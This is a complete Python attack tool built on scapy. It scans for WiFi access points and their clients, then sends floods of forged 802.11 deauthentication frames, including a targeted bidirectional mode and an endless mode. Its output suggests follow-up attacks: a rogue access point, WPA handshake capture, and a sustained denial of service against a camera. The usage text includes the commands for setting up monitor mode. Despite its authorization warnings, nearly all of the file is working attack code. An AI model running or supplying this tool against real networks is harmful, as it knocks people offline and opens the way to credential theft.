#!/usr/bin/env python3
"""
WiFi Deauthentication Attack Tool

Sends forged 802.11 deauthentication frames to disconnect clients from
a target access point. Exploits the lack of 802.11w Protected Management
Frames (PMF) on the target AP.

Requires:
  - scapy (pip install scapy)
  - A WiFi adapter in monitor mode with packet injection support
  - Root privileges

WARNING: Only use on networks you own or have authorization to test.
Unauthorized deauthentication attacks are illegal in most jurisdictions.
"""

import argparse
import sys
import time


BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
DEAUTH_REASON_CLASS3 = 7  # Class 3 frame from nonassociated station


def check_dependencies():
    """Verify scapy is available."""
    try:
        from scapy.all import conf
        return True
    except ImportError:
        print("ERROR: scapy is required for this tool.", file=sys.stderr)
        print("Install with: pip install scapy", file=sys.stderr)
        sys.exit(1)


def scan_for_ap(interface, target_ssid=None, duration=10):
    """Scan for access points on the given monitor mode interface."""
    from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt

    print(f"[*] Scanning for access points on {interface} "
          f"({duration} seconds)...")

    aps = {}

    def handle_beacon(pkt):
        if not pkt.haslayer(Dot11Beacon):
            return
        bssid = pkt[Dot11].addr2
        if bssid in aps:
            return
        stats = pkt[Dot11Beacon].network_stats()
        ssid = stats.get("ssid", "")
        channel = stats.get("channel", 0)
        crypto = stats.get("crypto", set())

        aps[bssid] = {
            "ssid": ssid,
            "channel": channel,
            "crypto": crypto,
        }

        marker = ""
        if target_ssid and target_ssid in ssid:
            marker = " <-- TARGET"
        crypto_str = "/".join(crypto) if crypto else "OPEN"
        print(f"  {bssid}  CH:{channel:>2}  {crypto_str:<12}  {ssid}{marker}")

    sniff(iface=interface, prn=handle_beacon, timeout=duration, store=0)

    print(f"\n[*] Found {len(aps)} access point(s)")
    return aps


def scan_clients(interface, bssid, duration=15):
    """Scan for clients connected to a specific AP."""
    from scapy.all import sniff, Dot11

    print(f"[*] Scanning for clients of {bssid} ({duration} seconds)...")

    clients = set()

    def handle_packet(pkt):
        if not pkt.haslayer(Dot11):
            return
        # Check for data frames to/from the target AP
        addr1 = pkt[Dot11].addr1
        addr2 = pkt[Dot11].addr2

        if addr1 and addr2:
            if addr2.lower() == bssid.lower() and addr1 != BROADCAST_MAC:
                if addr1 not in clients:
                    clients.add(addr1)
                    print(f"  Client found: {addr1}")
            elif addr1.lower() == bssid.lower() and addr2 != BROADCAST_MAC:
                if addr2 not in clients:
                    clients.add(addr2)
                    print(f"  Client found: {addr2}")

    sniff(iface=interface, prn=handle_packet, timeout=duration, store=0)

    print(f"\n[*] Found {len(clients)} client(s)")
    return clients


def send_deauth(interface, bssid, client, count, interval, reason):
    """Send deauthentication frames."""
    from scapy.all import (
        RadioTap, Dot11, Dot11Deauth, sendp
    )

    target = client if client else BROADCAST_MAC
    target_desc = client if client else "BROADCAST (all clients)"

    print()
    print("=" * 60)
    print("WiFi Deauthentication Attack")
    print("=" * 60)
    print(f"  Target AP (BSSID) : {bssid}")
    print(f"  Target client     : {target_desc}")
    print(f"  Reason code       : {reason}")
    print(f"  Frame count       : {'infinite' if count == 0 else count}")
    print(f"  Interval          : {interval}s between rounds")
    print(f"  Interface         : {interface}")
    print("=" * 60)
    print()

    # Build deauth frame: AP -> Client (spoofed as coming from AP)
    deauth_ap_to_client = (
        RadioTap() /
        Dot11(
            type=0,       # Management frame
            subtype=12,   # Deauthentication
            addr1=target,  # Destination (client or broadcast)
            addr2=bssid,   # Source (spoofed AP)
            addr3=bssid,   # BSSID
        ) /
        Dot11Deauth(reason=reason)
    )

    # Build reverse deauth: Client -> AP (spoofed as coming from client)
    # This is more effective for targeted deauth
    deauth_client_to_ap = None
    if client and client != BROADCAST_MAC:
        deauth_client_to_ap = (
            RadioTap() /
            Dot11(
                type=0,
                subtype=12,
                addr1=bssid,   # Destination (AP)
                addr2=client,  # Source (spoofed client)
                addr3=bssid,   # BSSID
            ) /
            Dot11Deauth(reason=reason)
        )

    sent = 0
    try:
        i = 0
        while count == 0 or i < count:
            i += 1
            # Send AP -> Client deauth
            sendp(deauth_ap_to_client, iface=interface, count=64,
                  inter=0.001, verbose=0)
            sent += 64

            # Send Client -> AP deauth (if targeted)
            if deauth_client_to_ap:
                sendp(deauth_client_to_ap, iface=interface, count=64,
                      inter=0.001, verbose=0)
                sent += 64

            direction = "bidirectional" if deauth_client_to_ap else "AP->client"
            print(f"  [Round {i}] Sent 64 deauth frames ({direction}). "
                  f"Total: {sent}")

            if interval > 0 and (count == 0 or i < count):
                time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n[*] Attack stopped by user after {sent} frames.")

    print(f"\n[+] Deauthentication complete. Sent {sent} total frames.")
    print()
    print("[*] Impact:")
    print("    - Clients are disconnected from the AP")
    print("    - Camera feed and web interface become unreachable")
    print("    - Clients will auto-reconnect when attack stops")
    print()
    print("[*] Follow-up attacks:")
    print("    - Start a rogue AP with same SSID to capture reconnections")
    print("    - Capture WPA handshake during reconnection (if WPA network)")
    print("    - Use sustained deauth as denial-of-service against camera")


def main():
    parser = argparse.ArgumentParser(
        description="WiFi deauthentication attack tool. Sends forged 802.11 "
                    "deauth frames to disconnect clients from a target AP. "
                    "Demonstrates the lack of 802.11w PMF protection.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --interface wlan1mon --scan
      Scan for access points on monitor mode interface

  %(prog)s --interface wlan1mon --bssid AA:BB:CC:DD:EE:FF --scan-clients
      Find clients connected to a specific AP

  %(prog)s --interface wlan1mon --bssid AA:BB:CC:DD:EE:FF --count 10
      Send 10 rounds of broadcast deauth to all clients

  %(prog)s --interface wlan1mon --bssid AA:BB:CC:DD:EE:FF \\
           --client 11:22:33:44:55:66 --count 5
      Send targeted deauth to a specific client (5 rounds)

  %(prog)s --interface wlan1mon --bssid AA:BB:CC:DD:EE:FF --count 0
      Continuous deauth (Ctrl+C to stop)

Setup (monitor mode):
  sudo airmon-ng check kill
  sudo airmon-ng start wlan1
  # Interface becomes wlan1mon

  # Or manually:
  sudo ip link set wlan1 down
  sudo iw dev wlan1 set type monitor
  sudo ip link set wlan1 up
  sudo iw dev wlan1 set channel 1

Prerequisites:
  pip install scapy
  sudo apt install aircrack-ng    (for airmon-ng)

WARNING: Only use on networks you own or have explicit authorization
to test. Unauthorized deauth attacks violate laws in most countries.
""")
    parser.add_argument(
        "--interface", "-i", default="wlan1mon",
        help="Monitor mode WiFi interface (default: wlan1mon)")
    parser.add_argument(
        "--bssid", "-b", metavar="MAC",
        help="Target AP BSSID (MAC address)")
    parser.add_argument(
        "--client", "-c", metavar="MAC",
        help="Target client MAC (default: broadcast to all clients)")
    parser.add_argument(
        "--count", "-n", type=int, default=10,
        help="Number of deauth rounds, 0 for infinite (default: 10)")
    parser.add_argument(
        "--interval", type=float, default=0.1,
        help="Delay in seconds between deauth rounds (default: 0.1)")
    parser.add_argument(
        "--reason", type=int, default=DEAUTH_REASON_CLASS3,
        help=f"Deauth reason code (default: {DEAUTH_REASON_CLASS3} = "
             f"Class 3 frame from nonassociated STA)")
    parser.add_argument(
        "--scan", action="store_true",
        help="Scan for access points before attacking")
    parser.add_argument(
        "--scan-clients", action="store_true",
        help="Scan for clients connected to --bssid")
    parser.add_argument(
        "--scan-duration", type=int, default=10,
        help="Scan duration in seconds (default: 10)")

    args = parser.parse_args()
    check_dependencies()

    if args.scan:
        scan_for_ap(args.interface, duration=args.scan_duration)
        if not args.bssid:
            return

    if args.scan_clients:
        if not args.bssid:
            print("[-] --scan-clients requires --bssid", file=sys.stderr)
            sys.exit(1)
        scan_clients(args.interface, args.bssid, duration=args.scan_duration)
        return

    if not args.bssid:
        print("[-] --bssid is required for deauth attack", file=sys.stderr)
        print("    Run with --scan first to find target AP", file=sys.stderr)
        sys.exit(1)

    send_deauth(
        args.interface, args.bssid, args.client,
        args.count, args.interval, args.reason)


if __name__ == "__main__":
    main()
